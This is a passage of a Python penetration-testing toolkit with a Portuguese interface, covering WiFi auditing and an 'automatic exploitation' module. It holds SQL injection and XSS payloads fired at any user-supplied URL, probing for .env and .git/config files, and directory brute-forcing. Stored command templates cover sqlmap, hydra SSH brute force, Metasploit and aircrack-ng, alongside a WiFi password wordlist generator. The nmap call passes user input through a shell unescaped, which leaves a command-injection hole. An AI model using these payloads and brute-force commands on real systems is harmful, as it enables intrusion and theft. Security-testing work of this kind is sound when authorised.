                self.wifi_vulnerability_scanner()
            elif choice == '4':
                self.wifi_wordlist_generator()
            elif choice == '5':
                self.antenna_calculator()
            elif choice == '6':
                self.attack_simulator()
            elif choice == '7':
                self.metadata_analyzer()
            elif choice == '8':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def wifi_spectrum_analyzer(self):
        """Analisador de espectro WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ANALISADOR DE ESPECTRO WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Esta função requer hardware específico (SDR){Style.RESET_ALL}")
        print(f"{Fore.CYAN}Alternativamente, use análise de canais com airodump-ng{Style.RESET_ALL}")
        
        # Análise de uso de canais
        print(f"\n{Fore.YELLOW}Analisando uso de canais...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(
                ['airodump-ng', self.monitor_interface, '--band', 'abg'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Analisar uso por canal
            channel_usage = {}
            
            for line in result.stdout.split('\n'):
                if 'Channel' in line and '[' in line:
                    parts = line.split()
                    for part in parts:
                        if part.startswith('[') and part.endswith(']'):
                            channel = part[1:-1]
                            if channel.isdigit():
                                channel_usage[int(channel)] = channel_usage.get(int(channel), 0) + 1
            
            print(f"\n{Fore.CYAN}Uso de canais 2.4GHz:{Style.RESET_ALL}")
            for channel in range(1, 14):
                count = channel_usage.get(channel, 0)
                bar = '█' * min(count, 10)
                print(f"  Canal {channel:2}: {bar} ({count} redes)")
            
            # Recomendações
            print(f"\n{Fore.YELLOW}RECOMENDAÇÕES:{Style.RESET_ALL}")
            print("Canais menos congestionados: ", end='')
            
            least_congested = sorted(channel_usage.items(), key=lambda x: x[1])[:3]
            for channel, count in least_congested:
                print(f"{channel} ({count} redes), ", end='')
            print()
            
        except Exception as e:
            print(f"{Fore.RED}Erro na análise: {e}{Style.RESET_ALL}")
    
    def wifi_intrusion_detection(self):
        """Detecção de intrusão WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'DETECÇÃO DE INTRUSÃO WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Monitorando ataques...{Style.RESET_ALL}")
        
        # Detectar ataques comuns
        attacks_to_detect = [
            'deauth', 'beacon_flood', 'probe_flood', 
            'evil_twin', 'arp_spoofing', 'wpa_attack'
        ]
        
        print(f"{Fore.CYAN}Procurando por:{Style.RESET_ALL}")
        for attack in attacks_to_detect:
            print(f"  • {attack}")
        
        try:
            # Capturar pacotes para análise
            cmd = [
                'tshark', '-i', self.monitor_interface,
                '-Y', 'wlan.fc.type_subtype==0x000c or wlan.fc.type_subtype==0x0008',
                '-a', 'duration:60'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=70)
            
            detected_attacks = []
            
            # Analisar para deauth attacks
            deauth_count = result.stdout.count('Deauthentication')
            if deauth_count > 10:
                detected_attacks.append(f'Deauth attack detectado ({deauth_count} pacotes)')
            
            # Analisar para beacon floods
            beacon_lines = [line for line in result.stdout.split('\n') if 'Beacon' in line]
            unique_beacons = set()
            for line in beacon_lines:
                # Extrair BSSID
                if 'BSSID:' in line:
                    bssid = line.split('BSSID:')[1].split()[0]
                    unique_beacons.add(bssid)
            
            if len(unique_beacons) > 20:
                detected_attacks.append(f'Beacon flood detectado ({len(unique_beacons)} redes únicas)')
            
            # Resultados
            print(f"\n{Fore.CYAN}RESULTADOS:{Style.RESET_ALL}")
            
            if detected_attacks:
                for attack in detected_attacks:
                    print(f"{Fore.RED}⚠ {attack}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}✓ Nenhum ataque detectado{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}Erro na detecção: {e}{Style.RESET_ALL}")
    
    def wifi_vulnerability_scanner(self):
        """Scanner de vulnerabilidades WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SCANNER DE VULNERABILIDADES WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Escaneando vulnerabilidades comuns...{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Scanner WPS
        print(f"{Fore.CYAN}Verificando WPS...{Style.RESET_ALL}")
        try:
            result = subprocess.run(
                ['wash', '-i', self.monitor_interface],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if 'WPS Locked' not in result.stdout:
                vulnerabilities.append('WPS desbloqueado - vulnerável a ataque Pixie Dust')
            
            wps_networks = len([line for line in result.stdout.split('\n') if 'Yes' in line])
            if wps_networks > 0:
                vulnerabilities.append(f'{wps_networks} redes com WPS ativo')
                
        except:
            print(f"{Fore.YELLOW}wash não disponível{Style.RESET_ALL}")
        
        # Verificar WEP
        print(f"{Fore.CYAN}Verificando WEP...{Style.RESET_ALL}")
        try:
            cmd = ['airodump-ng', self.monitor_interface, '--encrypt', 'WEP', '-a']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            wep_networks = len([line for line in result.stdout.split('\n') if 'WEP' in line])
            if wep_networks > 0:
                vulnerabilities.append(f'{wep_networks} redes WEP - extremamente vulneráveis')
                
        except:
            pass
        
        # Verificar redes abertas
        print(f"{Fore.CYAN}Verificando redes abertas...{Style.RESET_ALL}")
        try:
            cmd = ['airodump-ng', self.monitor_interface, '--encrypt', 'OPN', '-a']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            open_networks = len([line for line in result.stdout.split('\n') if 'OPN' in line])
            if open_networks > 0:
                vulnerabilities.append(f'{open_networks} redes abertas - tráfego não criptografado')
                
        except:
            pass
        
        # Resultados
        print(f"\n{Fore.CYAN}VULNERABILIDADES ENCONTRADAS:{Style.RESET_ALL}")
        
        if vulnerabilities:
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"{Fore.RED}{i}. {vuln}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✓ Nenhuma vulnerabilidade crítica encontrada{Style.RESET_ALL}")
        
        # Recomendações
        print(f"\n{Fore.YELLOW}RECOMENDAÇÕES DE SEGURANÇA:{Style.RESET_ALL}")
        print("1. Use WPA2-AES ou WPA3")
        print("2. Desative WPS")
        print("3. Use senhas fortes (mínimo 12 caracteres)")
        print("4. Desative redes abertas (sem senha)")
        print("5. Atualize firmware dos roteadores")
        print("6. Use canais menos congestionados")
    
    def wifi_wordlist_generator(self):
        """Gerador de wordlists para WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'GERADOR DE WORDLISTS WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de wordlists:{Style.RESET_ALL}")
        print("1. Baseada em padrões comuns")
        print("2. Baseada em informações da rede")
        print("3. Combinada de múltiplas fontes")
        print("4. Específica para WPA")
        
        choice = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self._generate_common_wifi_wordlist()
        elif choice == '2':
            self._generate_network_based_wordlist()
        elif choice == '3':
            self._generate_combined_wordlist()
        elif choice == '4':
            self._generate_wpa_specific_wordlist()
    
    def _generate_common_wifi_wordlist(self):
        """Gerar wordlist com padrões comuns"""
        print(f"\n{Fore.YELLOW}Gerando wordlist de padrões comuns...{Style.RESET_ALL}")
        
        common_patterns = [
            # Senhas simples
            '12345678', '123456789', '1234567890',
            'password', 'password1', 'password123',
            'admin', 'admin123', 'administrator',
            'root', 'root123', 'toor',
            
            # Nomes comuns
            'wifi', 'wireless', 'network',
            'home', 'homewifi', 'family',
            'office', 'company', 'business',
            
            # Padrões de teclado
            'qwerty', 'qwerty123', 'qwertyuiop',
            'asdfghjkl', 'zxcvbnm', '1q2w3e4r',
            '1qaz2wsx', 'zaq12wsx',
            
            # Datas
            '01011970', '01012000', '01012010',
            '12345678', '87654321',
            
            # Combinados
            'wifi1234', 'wifi2023', 'wifi2024',
            'home1234', 'office2023',
            
            # Defaults de fabricantes
            'admin', 'password', '1234',
            'default', 'public', 'guest'
        ]
        
        # Gerar variações
        variations = []
        
        for pattern in common_patterns:
            variations.append(pattern)
            variations.append(pattern.upper())
            variations.append(pattern.capitalize())
            
            # Adicionar números
            for i in range(10):
                variations.append(f"{pattern}{i}")
                variations.append(f"{pattern}{i}{i}")
                variations.append(f"{pattern}{i}{i}{i}")
            
            # Adicionar caracteres especiais
            for special in ['!', '@', '#', '$', '%']:
                variations.append(f"{pattern}{special}")
        
        # Remover duplicatas
        variations = list(set(variations))
        
        # Salvar
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        wordlist_file = Config.WORDLISTS_DIR / f"wifi_common_{timestamp}.txt"
        
        with open(wordlist_file, 'w') as f:
            for word in sorted(variations):
                if 8 <= len(word) <= 63:  # Tamanhos válidos para WPA
                    f.write(f"{word}\n")
        
        print(f"{Fore.GREEN}✓ Wordlist criada com {len(variations)} entradas")
        print(f"  Arquivo: {wordlist_file}{Style.RESET_ALL}")
        
        return str(wordlist_file)
    
    def antenna_calculator(self):
        """Calculadora de antenas WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'CALCULADORA DE ANTENAS WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Cálculos disponíveis:{Style.RESET_ALL}")
        print("1. Ganho de antena")
        print("2. Distância máxima")
        print("3. Perda no espaço livre")
        print("4. Ângulo de cobertura")
        
        calc_type = input(f"\n{Fore.GREEN}Selecione cálculo [1-4]: {Style.RESET_ALL}").strip()
        
        if calc_type == '1':
            self._calculate_antenna_gain()
        elif calc_type == '2':
            self._calculate_max_distance()
        elif calc_type == '3':
            self._calculate_free_space_loss()
        elif calc_type == '4':
            self._calculate_coverage_angle()
    
    def _calculate_antenna_gain(self):
        """Calcular ganho de antena"""
        print(f"\n{Fore.YELLOW}Cálculo de ganho de antena{Style.RESET_ALL}")
        
        frequency = float(input(f"{Fore.GREEN}Frequência (GHz) [2.4 ou 5.0]: {Style.RESET_ALL}") or "2.4")
        diameter = float(input(f"{Fore.GREEN}Diâmetro da antena (metros): {Style.RESET_ALL}") or "0.1")
        efficiency = float(input(f"{Fore.GREEN}Eficiência (0.0 a 1.0) [padrão: 0.55]: {Style.RESET_ALL}") or "0.55")
        
        # Fórmula: Ganho (dBi) = 10 * log10(efficiency * (π * diameter / wavelength)^2)
        wavelength = 0.3 / frequency  # metros (300 / freq em MHz)
        gain_dbi = 10 * math.log10(efficiency * (math.pi * diameter / wavelength) ** 2)
        
        print(f"\n{Fore.CYAN}RESULTADOS:{Style.RESET_ALL}")
        print(f"Frequência: {frequency} GHz")
        print(f"Comprimento de onda: {wavelength:.3f} metros")
        print(f"Ganho calculado: {gain_dbi:.2f} dBi")
        
        # Interpretação
        if gain_dbi < 6:
            print(f"{Fore.YELLOW}Antena: Omnidirecional padrão{Style.RESET_ALL}")
        elif gain_dbi < 12:
            print(f"{Fore.GREEN}Antena: Direcional média{Style.RESET_ALL}")
        elif gain_dbi < 24:
            print(f"{Fore.CYAN}Antena: Direcional alta{Style.RESET_ALL}")
        else:
            print(f"{Fore.MAGENTA}Antena: Parabólica profissional{Style.RESET_ALL}")
    
    def attack_simulator(self):
        """Simulador de ataques WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SIMULADOR DE ATAQUES WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Simulações disponíveis:{Style.RESET_ALL}")
        print("1. Simulação de ataque de dicionário WPA")
        print("2. Simulação de ataque WEP")
        print("3. Simulação de Evil Twin")
        print("4. Simulação de Deauth Attack")
        
        simulation = input(f"\n{Fore.GREEN}Selecione simulação [1-4]: {Style.RESET_ALL}").strip()
        
        if simulation == '1':
            self._simulate_wpa_dictionary_attack()
        elif simulation == '2':
            self._simulate_wep_attack()
        elif simulation == '3':
            self._simulate_evil_twin()
        elif simulation == '4':
            self._simulate_deauth_attack()
    
    def _simulate_wpa_dictionary_attack(self):
        """Simular ataque de dicionário WPA"""
        print(f"\n{Fore.YELLOW}Simulação de ataque de dicionário WPA{Style.RESET_ALL}")
        
        wordlist_size = int(input(f"{Fore.GREEN}Tamanho da wordlist [padrão: 1000]: {Style.RESET_ALL}") or "1000")
        password_strength = input(f"{Fore.GREEN}Força da senha (fraca/média/forte) [padrão: média]: {Style.RESET_ALL}") or "média"
        
        # Parâmetros baseados na força
        if password_strength == 'fraca':
            success_rate = 0.8  # 80% de chance de sucesso
            time_factor = 0.1
        elif password_strength == 'forte':
            success_rate = 0.01  # 1% de chance de sucesso
            time_factor = 10
        else:  # média
            success_rate = 0.2  # 20% de chance de sucesso
            time_factor = 1
        
        # Tempo estimado
        estimated_time = (wordlist_size / 100) * time_factor  # segundos
        
        print(f"\n{Fore.CYAN}PARÂMETROS DA SIMULAÇÃO:{Style.RESET_ALL}")
        print(f"Tamanho da wordlist: {wordlist_size}")
        print(f"Força da senha: {password_strength}")
        print(f"Taxa de sucesso estimada: {success_rate*100:.1f}%")
        print(f"Tempo estimado: {estimated_time:.1f} segundos")
        
        # Simular
        print(f"\n{Fore.YELLOW}Simulando...{Style.RESET_ALL}")
        
        for i in range(min(10, wordlist_size // 100)):
            progress = (i + 1) * 10
            print(f"  Testando senhas... {progress}%")
            sleep(0.5)
        
        # Resultado
        import random
        if random.random() < success_rate:
            print(f"\n{Fore.GREEN}✓ SENHA ENCONTRADA!")
            print(f"Tempo: {estimated_time * random.uniform(0.5, 1.5):.1f} segundos{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}✗ Senha não encontrada")
            print(f"Tente aumentar a wordlist ou usar regras{Style.RESET_ALL}")
    
    def metadata_analyzer(self):
        """Analisador de metadados WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ANALISADOR DE METADADOS WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Extraindo metadados de arquivos de captura...{Style.RESET_ALL}")
        
        pcap_files = list(Config.CAPTURES_DIR.glob("*.pcap")) + \
                    list(Config.CAPTURES_DIR.glob("*.cap"))
        
        if not pcap_files:
            print(f"{Fore.RED}Nenhum arquivo de captura encontrado!{Style.RESET_ALL}")
            return
        
        # Analisar cada arquivo
        for pcap_file in pcap_files[:5]:  # Limitar a 5 arquivos
            print(f"\n{Fore.CYAN}Analisando: {pcap_file.name}{Style.RESET_ALL}")
            
            try:
                # Informações básicas
                size = os.path.getsize(pcap_file)
                created = datetime.fromtimestamp(os.path.getctime(pcap_file))
                
                print(f"  Tamanho: {size / 1024 / 1024:.2f} MB")
                print(f"  Criado: {created}")
                
                # Informações do pcap
                cmd = ['capinfos', str(pcap_file)]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Number of packets' in line:
                            print(f"  {line.strip()}")
                        elif 'File type' in line:
                            print(f"  {line.strip()}")
                        elif 'Data size' in line:
                            print(f"  {line.strip()}")
                
            except Exception as e:
                print(f"  {Fore.RED}Erro: {e}{Style.RESET_ALL}")
        
        # Estatísticas gerais
        total_files = len(pcap_files)
        total_size = sum(os.path.getsize(f) for f in pcap_files) / 1024 / 1024
        
        print(f"\n{Fore.YELLOW}ESTATÍSTICAS GERAIS:{Style.RESET_ALL}")
        print(f"Total de arquivos: {total_files}")
        print(f"Tamanho total: {total_size:.2f} MB")
        print(f"Mais antigo: {min(pcap_files, key=os.path.getctime).name}")
        print(f"Mais recente: {max(pcap_files, key=os.path.getctime).name}")

# ============================================================================
# SISTEMA DE EXPLORAÇÃO AUTOMÁTICA
# ============================================================================

class AutoExploitationSystem:
    """Sistema de exploração automática"""
    
    def __init__(self):
        self.logger = logging.getLogger('AutoExploitation')
        self.exploits_db = self._load_exploits_database()
        
    def _load_exploits_database(self):
        """Carregar banco de dados de exploits"""
        db_file = Config.EXPLOITS_DIR / "exploits.json"
        
        if db_file.exists():
            try:
                with open(db_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        # Banco de dados padrão
        default_exploits = {
            'web': {
                'sql_injection': {
                    'description': 'Injeção de SQL',
                    'tools': ['sqlmap', 'sqlninja'],
                    'command': 'sqlmap -u {target} --batch --risk=3 --level=5',
                    'risk': 'high'
                },
                'xss': {
                    'description': 'Cross-Site Scripting',
                    'tools': ['xsstrike', 'xsser'],
                    'command': 'xsstrike --url {target}',
                    'risk': 'medium'
                },
                'lfi': {
                    'description': 'Local File Inclusion',
                    'tools': ['ffuf', 'gobuster'],
                    'command': 'ffuf -w {wordlist} -u {target}/FUZZ',
                    'risk': 'medium'
                },
                'rce': {
                    'description': 'Remote Code Execution',
                    'tools': ['metasploit', 'searchsploit'],
                    'command': 'msfconsole -q -x "use exploit/{exploit}; set RHOSTS {target}; run"',
                    'risk': 'critical'
                }
            },
            'network': {
                'ftp_anonymous': {
                    'description': 'Login FTP anônimo',
                    'command': 'ftp {target}',
                    'risk': 'low'
                },
                'ssh_bruteforce': {
                    'description': 'Força bruta SSH',
                    'command': 'hydra -l {user} -P {wordlist} ssh://{target}',
                    'risk': 'medium'
                },
                'smb_null_session': {
                    'description': 'Sessão nula SMB',
                    'command': 'smbclient -L {target} -N',
                    'risk': 'medium'
                }
            },
            'wifi': {
                'wpa_handshake': {
                    'description': 'Captura de handshake WPA',
                    'command': 'airodump-ng --bssid {bssid} -c {channel} -w {output} {interface}',
                    'risk': 'high'
                },
                'wep_attack': {
                    'description': 'Ataque WEP',
                    'command': 'aircrack-ng {capture_file} -b {bssid}',
                    'risk': 'high'
                }
            }
        }
        
        return default_exploits
    
    def interactive_exploitation(self):
        """Interface interativa de exploração"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SISTEMA DE EXPLORAÇÃO AUTOMÁTICA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}Modos de exploração:{Style.RESET_ALL}")
            print("1. Exploração direcionada")
            print("2. Scan e exploração automática")
            print("3. Ver banco de dados de exploits")
            print("4. Adicionar exploit personalizado")
            print("5. Executar teste de penetração completo")
            print("6. Voltar")
            
            choice = input(f"\n{Fore.GREEN}Selecione opção [1-6]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.targeted_exploitation()
            elif choice == '2':
                self.auto_scan_and_exploit()
            elif choice == '3':
                self.view_exploits_database()
            elif choice == '4':
                self.add_custom_exploit()
            elif choice == '5':
                self.full_pentest()
            elif choice == '6':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def targeted_exploitation(self):
        """Exploração direcionada"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'EXPLORAÇÃO DIRECIONADA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        target = input(f"\n{Fore.GREEN}Alvo (IP/URL): {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}Alvo é obrigatório!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Tipos de exploração para {target}:{Style.RESET_ALL}")
        print("1. Exploração Web")
        print("2. Exploração de Rede")
        print("3. Exploração WiFi")
        print("4. Exploração Personalizada")
        
        exp_type = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        if exp_type == '1':
            self.web_exploitation(target)
        elif exp_type == '2':
            self.network_exploitation(target)
        elif exp_type == '3':
            self.wifi_exploitation(target)
        elif exp_type == '4':
            self.custom_exploitation(target)
    
    def web_exploitation(self, target):
        """Exploração Web"""
        print(f"\n{Fore.YELLOW}Exploração Web - {target}{Style.RESET_ALL}")
        
        # Verificar se target é URL
        if not (target.startswith('http://') or target.startswith('https://')):
            target = f"http://{target}"
        
        print(f"\n{Fore.CYAN}Testando vulnerabilidades comuns...{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Teste de diretórios
        print(f"{Fore.YELLOW}1. Enumerando diretórios...{Style.RESET_ALL}")
        dirs_found = self._enumerate_directories(target)
        if dirs_found:
            vulnerabilities.append(f"Diretórios encontrados: {', '.join(dirs_found[:5])}")
        
        # Teste de arquivos sensíveis
        print(f"{Fore.YELLOW}2. Buscando arquivos sensíveis...{Style.RESET_ALL}")
        sensitive_files = self._find_sensitive_files(target)
        if sensitive_files:
            vulnerabilities.append(f"Arquivos sensíveis: {', '.join(sensitive_files)}")
        
        # Teste de headers
        print(f"{Fore.YELLOW}3. Analisando headers...{Style.RESET_ALL}")
        header_vulns = self._analyze_headers(target)
        vulnerabilities.extend(header_vulns)
        
        # Teste SQLi básico
        print(f"{Fore.YELLOW}4. Testando SQL injection...{Style.RESET_ALL}")
        if self._test_sqli(target):
            vulnerabilities.append("Possível SQL injection")
        
        # Teste XSS básico
        print(f"{Fore.YELLOW}5. Testando XSS...{Style.RESET_ALL}")
        if self._test_xss(target):
            vulnerabilities.append("Possível XSS")
        
        # Resultados
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'RESULTADOS DA EXPLORAÇÃO WEB':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"\n{Fore.RED}VULNERABILIDADES ENCONTRADAS:{Style.RESET_ALL}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"{i}. {vuln}")
            
            # Sugerir exploits
            print(f"\n{Fore.YELLOW}EXPLOITS SUGERIDOS:{Style.RESET_ALL}")
            
            if "SQL injection" in ' '.join(vulnerabilities):
                print("• sqlmap - Injeção de SQL avançada")
                print("  Comando: sqlmap -u {target} --batch --risk=3 --level=5")
            
            if "XSS" in ' '.join(vulnerabilities):
                print("• xsstrike - Detector de XSS")
                print("  Comando: xsstrike --url {target} --crawl")
            
            if "admin" in ' '.join(vulnerabilities).lower():
                print("• hydra - Força bruta em painel admin")
                print("  Comando: hydra -l admin -P rockyou.txt {target} http-post-form")
            
        else:
            print(f"\n{Fore.GREEN}✓ Nenhuma vulnerabilidade óbvia encontrada{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Recomenda-se testes mais aprofundados{Style.RESET_ALL}")
        
        # Salvar relatório
        self._save_web_report(target, vulnerabilities)
    
    def _enumerate_directories(self, url):
        """Enumerar diretórios comuns"""
        common_dirs = [
            'admin', 'administrator', 'backup', 'config', 'db',
            'database', 'docs', 'download', 'images', 'includes',
            'js', 'lib', 'logs', 'mail', 'phpmyadmin', 'private',
            'secret', 'secure', 'server', 'sql', 'tmp', 'upload',
            'uploads', 'user', 'users', 'var', 'web', 'webadmin',
            'wordpress', 'wp', 'wp-admin', 'wp-content', 'wp-includes'
        ]
        
        found_dirs = []
        
        try:
            if REQUESTS_AVAILABLE:
                for directory in common_dirs[:20]:  # Limitar para velocidade
                    test_url = f"{url.rstrip('/')}/{directory}/"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code < 400:
                            found_dirs.append(directory)
                    except:
                        pass
        except:
            pass
        
        return found_dirs
    
    def _find_sensitive_files(self, url):
        """Buscar arquivos sensíveis"""
        sensitive_files = [
            'config.php', 'config.inc.php', 'database.php',
            '.env', '.git/config', '.htaccess', 'robots.txt',
            'sitemap.xml', 'crossdomain.xml', 'phpinfo.php',
            'info.php', 'test.php', 'backup.sql', 'dump.sql',
            'backup.zip', 'backup.tar.gz', 'backup.rar'
        ]
        
        found_files = []
        
        try:
            if REQUESTS_AVAILABLE:
                for filename in sensitive_files[:15]:
                    test_url = f"{url.rstrip('/')}/{filename}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code == 200:
                            # Verificar conteúdo
                            if len(response.text) < 10000:  # Não pegar arquivos muito grandes
                                found_files.append(filename)
                    except:
                        pass
        except:
            pass
        
        return found_files
    
    def _analyze_headers(self, url):
        """Analisar headers HTTP"""
        vulnerabilities = []
        
        try:
            if REQUESTS_AVAILABLE:
                response = requests.get(url, timeout=10, verify=False)
                headers = response.headers
                
                # Verificar headers de segurança
                security_headers = {
                    'X-Frame-Options': 'Proteção contra clickjacking',
                    'X-Content-Type-Options': 'Previne MIME sniffing',
                    'X-XSS-Protection': 'Proteção XSS',
                    'Strict-Transport-Security': 'HSTS',
                    'Content-Security-Policy': 'Política de segurança de conteúdo'
                }
                
                missing_headers = []
                for header, description in security_headers.items():
                    if header not in headers:
                        missing_headers.append(description)
                
                if missing_headers:
                    vulnerabilities.append(f"Headers de segurança ausentes: {', '.join(missing_headers)}")
                
                # Verificar server header
                if 'Server' in headers:
                    server = headers['Server']
                    vulnerabilities.append(f"Server: {server} - Pode revelar informações")
                
                # Verificar powered-by
                if 'X-Powered-By' in headers:
                    powered_by = headers['X-Powered-By']
                    vulnerabilities.append(f"Tecnologia: {powered_by} - Pode ser explorada")
                    
        except:
            pass
        
        return vulnerabilities
    
    def _test_sqli(self, url):
        """Teste básico de SQL injection"""
        test_payloads = [
            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--"
        ]
        
        try:
            if REQUESTS_AVAILABLE:
                for payload in test_payloads[:3]:
                    test_url = f"{url}?id={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        # Verificações básicas de erro SQL
                        error_indicators = [
                            'sql', 'SQL', 'mysql', 'MySQL', 'syntax',
                            'error', 'Error', 'warning', 'Warning',
                            'unclosed', 'Unclosed', 'quote', 'Quote'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator in response.text:
                                return True
                    except:
                        pass
        except:
            pass
        
        return False
    
    def _test_xss(self, url):
        """Teste básico de XSS"""
        test_payloads = [
            '<script>alert(1)</script>',
            '\'"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>'
        ]
        
        try:
            if REQUESTS_AVAILABLE:
                for payload in test_payloads[:2]:
                    test_url = f"{url}?q={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if payload in response.text:
                            return True
                    except:
                        pass
        except:
            pass
        
        return False
    
    def _save_web_report(self, target, vulnerabilities):
        """Salvar relatório de exploração web"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = Config.REPORTS_DIR / f"web_exploit_{target.replace('/', '_')}_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write(f"Relatório de Exploração Web\n")
            f.write(f"{'='*60}\n")
            f.write(f"Alvo: {target}\n")
            f.write(f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n\n")
            
            f.write("VULNERABILIDADES ENCONTRADAS:\n")
            f.write("-" * 40 + "\n")
            
            if vulnerabilities:
                for i, vuln in enumerate(vulnerabilities, 1):
                    f.write(f"{i}. {vuln}\n")
            else:
                f.write("Nenhuma vulnerabilidade encontrada\n")
            
            f.write("\nRECOMENDAÇÕES:\n")
            f.write("-" * 40 + "\n")
            f.write("1. Realizar testes mais aprofundados\n")
            f.write("2. Usar ferramentas especializadas\n")
            f.write("3. Verificar manualmente pontos críticos\n")
        
        print(f"\n{Fore.GREEN}Relatório salvo em: {report_file}{Style.RESET_ALL}")
    
    def auto_scan_and_exploit(self):
        """Scan e exploração automática"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SCAN E EXPLORAÇÃO AUTOMÁTICA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        target = input(f"\n{Fore.GREEN}Alvo (IP ou rede CIDR): {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}Alvo é obrigatório!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Selecionando tipo de scan...{Style.RESET_ALL}")
        print("1. Scan rápido (portas comuns)")
        print("2. Scan completo (todas as portas)")
        print("3. Scan com detecção de serviços")
        print("4. Scan com scripts NSE")
        
        scan_type = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        # Executar nmap
        print(f"\n{Fore.YELLOW}Executando scan...{Style.RESET_ALL}")
        
        nmap_args = {
            '1': '-F -sS -T4',
            '2': '-p- -sS -T4',
            '3': '-sV -sC -O -T4',
            '4': '-sV -sC --script vuln -T4'
        }
        
        args = nmap_args.get(scan_type, '-sV -sC -T4')
        
        try:
            cmd = f"nmap {args} {target}"
            print(f"{Fore.CYAN}Comando: {cmd}{Style.RESET_ALL}")
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                print(f"\n{Fore.GREEN}✓ Scan concluído!{Style.RESET_ALL}")
                
                # Analisar resultados
                open_ports = self._parse_nmap_output(result.stdout)
                
                if open_ports:
                    print(f"\n{Fore.YELLOW}PORTAS ABERTAS ENCONTRADAS:{Style.RESET_ALL}")
                    for port, service in open_ports.items():
                        print(f"  {port}/tcp - {service}")
                    
                    # Sugerir exploits
                    self._suggest_exploits(open_ports, target)
                else:
                    print(f"\n{Fore.RED}Nenhuma porta aberta encontrada{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Erro no scan: {result.stderr}{Style.RESET_ALL}")
                
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}Timeout no scan{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Erro: {e}{Style.RESET_ALL}")
    
    def _parse_nmap_output(self, output):
        """Analisar output do nmap"""
        open_ports = {}
        
        lines = output.split('\n')
        in_port_section = False
        
        for line in lines:
            if 'PORT' in line and 'STATE' in line and 'SERVICE' in line:
                in_port_section = True
                continue
            
